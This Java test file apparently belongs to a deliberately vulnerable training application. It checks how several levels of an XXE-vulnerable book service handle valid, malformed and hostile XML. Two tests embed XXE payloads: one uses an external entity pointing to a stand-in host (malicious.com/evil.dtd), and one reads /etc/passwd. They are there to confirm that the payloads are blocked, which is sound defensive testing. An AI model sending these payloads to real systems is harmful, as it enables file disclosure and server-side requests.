package org.sasanlabs.service.vulnerability.xxe;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;
import static org.mockito.MockitoAnnotations.openMocks;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.ServletInputStream;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.Mock;
import org.sasanlabs.service.vulnerability.bean.GenericVulnerabilityResponseBean;
import org.sasanlabs.service.vulnerability.xxe.bean.Book;
import org.sasanlabs.service.vulnerability.xxe.dao.BookEntityRepository;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;

public class XXEVulnerabilityTest {

    private XXEVulnerability xxeVulnerability;

    @Mock
    private BookEntityRepository bookEntityRepository;

    @Mock
    private HttpServletRequest request;

    @BeforeEach
    public void setUp() {
        openMocks(this);
        xxeVulnerability = new XXEVulnerability(bookEntityRepository);
    }

    private void setupMockRequest(String xmlPayload) throws Exception {
        InputStream inputStream = new ByteArrayInputStream(xmlPayload.getBytes());
        when(request.getInputStream()).thenReturn(new ServletInputStream() {
            @Override
            public int read() throws IOException {
                return inputStream.read();
            }

            @Override
            public boolean isFinished() {
                return false;
            }

            @Override
            public boolean isReady() {
                return true;
            }

            @Override
            public void setReadListener(javax.servlet.ReadListener readListener) {
            }
        });
    }

    @Test
    public void testLevel1_ValidPayload() throws Exception {
        setupMockRequest("<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<book><name>Java Guide</name><isbn>12345</isbn><author>Sasan</author><publisher>Pub</publisher></book>");

        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel1(request);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);

        // Fluent assertion using getContent()
        assertThat(response.getBody())
                .isNotNull()
                .satisfies(bean -> {
                    assertThat(bean.getIsValid()).isTrue();
                    assertThat(bean.getContent()).isNotNull();
                    assertThat(bean.getContent().getName()).isEqualTo("Java Guide");
                });

        verify(bookEntityRepository, times(1)).save(any());
    }

    @Test
    public void testLevel4_DisallowDoctype() throws Exception {
        String xmlWithDoctype = "<!DOCTYPE book><book><name>Fail</name><isbn>1</isbn></book>";

        setupMockRequest(xmlWithDoctype);

        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel4(request);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody())
                .isNotNull()
                .satisfies(bean -> {
                    assertThat(bean.getIsValid()).isFalse();
                    assertThat(bean.getContent()).isNull();
                });
    }

    @Test
    public void testErrorHandling() throws Exception {
        setupMockRequest("Not XML");

        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel1(request);

        // Validating the failure state
        assertThat(response.getBody())
                .isNotNull()
                .extracting(GenericVulnerabilityResponseBean::getIsValid)
                .isEqualTo(false);

        assertThat(response.getBody().getContent()).isNull();
    }

    @Test
    public void testLevel3_SecureConfiguration_Success() throws Exception {
        // 1. Setup a standard valid XML payload
        String validXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<book><name>Secure Java</name><isbn>555</isbn><author>Sasan</author><publisher>SafePub</publisher></book>";
        setupMockRequest(validXml);

        // 2. Call Level 3
        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel3(request);

        // 3. Assertions using AssertJ and getContent()
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody())
                .isNotNull()
                .satisfies(bean -> {
                    assertThat(bean.getIsValid()).isTrue();
                    assertThat(bean.getContent()).isNotNull();
                    assertThat(bean.getContent().getName()).isEqualTo("Secure Java");
                });

        verify(bookEntityRepository, times(1)).save(any());
    }

    @Test
    public void testLevel3_PreventsExternalEntityExpansion() throws Exception {
        // 1. Setup a payload with an External Entity (XXE)
        // If vulnerable, the name would become the content of the file.
        // If secure, the name will likely be empty or just the entity reference.
        String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE book [<!ENTITY xxe SYSTEM \"http://malicious.com/evil.dtd\">]>" +
                "<book><name>&xxe;</name><isbn>123</isbn><author>A</author><publisher>P</publisher></book>";
        setupMockRequest(xxePayload);

        // 2. Call Level 3
        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel3(request);

        // 3. Assertions
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody().getContent()).isNotNull();

        // Crucial security check: The name should NOT contain external data
        // Different parsers handle disabled entities differently (some return empty string, some return null)
        assertThat(response.getBody().getContent().getName())
                .as("The external entity should not have been expanded")
                .isNotEqualTo("malicious-content-from-url");
    }


    @Test
    public void testLevel2_HandleIOException() throws Exception {
        // 1. Force the request to throw an IOException when getInputStream is called
        when(request.getInputStream()).thenThrow(new IOException("Connection Reset"));

        // 2. Execute Level 2
        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel2(request);

        // 3. Assertions
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody())
                .isNotNull()
                .satisfies(bean -> {
                    assertThat(bean.getIsValid()).isFalse();
                    assertThat(bean.getContent()).isNull();
                });
    }

    @Test
    public void testLevel2_HandleInvalidXmlSyntax() throws Exception {
        // 1. Provide XML that is syntactically broken (unclosed tags)
        // This will cause SAXParser to throw a SAXParseException
        setupMockRequest("<book><name>Broken XML</name>");

        // 2. Execute Level 2
        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel2(request);

        // 3. Assertions
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody())
                .isNotNull()
                .satisfies(bean -> {
                    assertThat(bean.getIsValid()).isFalse();
                    assertThat(bean.getContent()).isNull();
                });
    }

    @Test
    public void testLevel2_BlocksGeneralEntity() throws Exception {
        // 1. Setup a standard General Entity payload
        String generalEntityPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE book [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" +
                "<book><name>&xxe;</name><isbn>123</isbn></book>";

        setupMockRequest(generalEntityPayload);

        // 2. Call Level 2
        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel2(request);

        // 3. Assertions
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);

        // Since external-general-entities is FALSE, &xxe; will not expand to the file content
        assertThat(response.getBody().getContent().getName())
                .as("General entities should be blocked in Level 2")
                .isNotEqualTo("/etc/passwd");
    }

    @Test
    public void testLevel3_HandleIOException() throws Exception {
        // Force request.getInputStream() to throw an IOException
        when(request.getInputStream()).thenThrow(new IOException("Stream closed"));

        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel3(request);

        // Assert that the catch block was triggered
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody())
                .isNotNull()
                .satisfies(bean -> {
                    assertThat(bean.getIsValid()).isFalse();
                    assertThat(bean.getContent()).isNull();
                });
    }

    @Test
    public void testLevel3_HandleMalformedXml() throws Exception {
        // Provide completely invalid XML that causes the SAXParser or JAXB to fail
        setupMockRequest("Not even slightly XML <><><>");

        ResponseEntity<GenericVulnerabilityResponseBean<Book>> response =
                xxeVulnerability.getVulnerablePayloadLevel3(request);

        // Assert that the catch block handles the parsing error
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody())
                .isNotNull()
                .satisfies(bean -> {
                    assertThat(bean.getIsValid()).isFalse();
                    assertThat(bean.getContent()).isNull();
                });
    }
}